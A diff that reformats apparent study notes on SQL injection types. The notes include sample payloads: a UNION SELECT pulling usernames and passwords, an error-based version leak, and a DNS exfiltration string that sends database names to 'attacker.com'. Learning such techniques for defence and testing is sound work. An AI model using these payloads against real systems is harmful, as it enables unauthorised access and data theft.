@@ -16,13 +16,12 @@ There are two types of databases, relational and non-relational -
     - Examples: MongoDB, Redis, Cassandra
 
 ## 3 types of SQLi
-#### In-band - Where the attacker receives results directly in the same communication channel they used to send the attack. First choice when application shows database errors or results
+### In-band - Where the attacker receives results directly in the same communication channel they used to send the attack. First choice when application shows database errors or results
 - Union based
     - How it works: Uses the UNION operator to combine results from the original query with results from a malicious query
     - Requirements: Both queries must have the same number of columns with compatible data types
     - Process: Determine number of columns (ORDER BY or trial/error) --> Find which columns display data --> Extract information using UNION SELECT
     - Example: `' UNION SELECT username,password FROM users-- -`
-    - 
     - Best case scenario: Full database dump possible
 - Error based
     - How it works: Forces the database to produce error messages that reveal information
@@ -30,7 +29,7 @@ There are two types of databases, relational and non-relational -
     - Example: `' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
     - Limitation: Only small amounts of data per error
 
-#### Blind - Where no direct output is returned, so attackers infer information based on application behavior.
+### Blind - Where no direct output is returned, so attackers infer information based on application behavior.
 - Boolean (When application responds differently to true/false conditions)
     - How it works: Sends queries that return True/False responses based on application behavior
     - Process: Ask yes/no questions about the database
@@ -43,28 +42,24 @@ There are two types of databases, relational and non-relational -
     - Logic: If condition is true, page takes 5+ seconds to load
     - Characteristics: Very slow, but works when no other feedback exists
       
-#### Out-of-band - where it uses different communication channels to receive results (separate from the attack channel). Used w2hen all other methods fail, or for stealth/speed in advanced scenarios.
+### Out-of-band - where it uses different communication channels to receive results (separate from the attack channel). Used w2hen all other methods fail, or for stealth/speed in advanced scenarios.
 - How it works:
     - Triggers database to make external connections (HTTP, DNS, SMB)
     - Data is sent to attacker-controlled external server
     - Useful when in-band methods don't work due to firewalls/filtering
-
 - Common techniques:
     - DNS exfiltration: `' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share')))-- -`
     - HTTP requests: Database makes HTTP calls to attacker's server with data in URL
     - Email: Some databases can send emails with extracted data
-
 - Requirements:
     - Database must have network access
     - Specific database functions enabled (like xp_cmdshell in SQL Server)
     - Attacker needs external infrastructure to receive data
-
-Characteristics:
-
-Most complex to set up
-Often fastest for large data extraction
-Bypasses many filtering mechanisms
-Requires advanced database privileges
+- Characteristics:
+    - Most complex to set up
+    - Often fastest for large data extraction
+    - Bypasses many filtering mechanisms
+    - Requires advanced database privileges
 
 # Resources
 
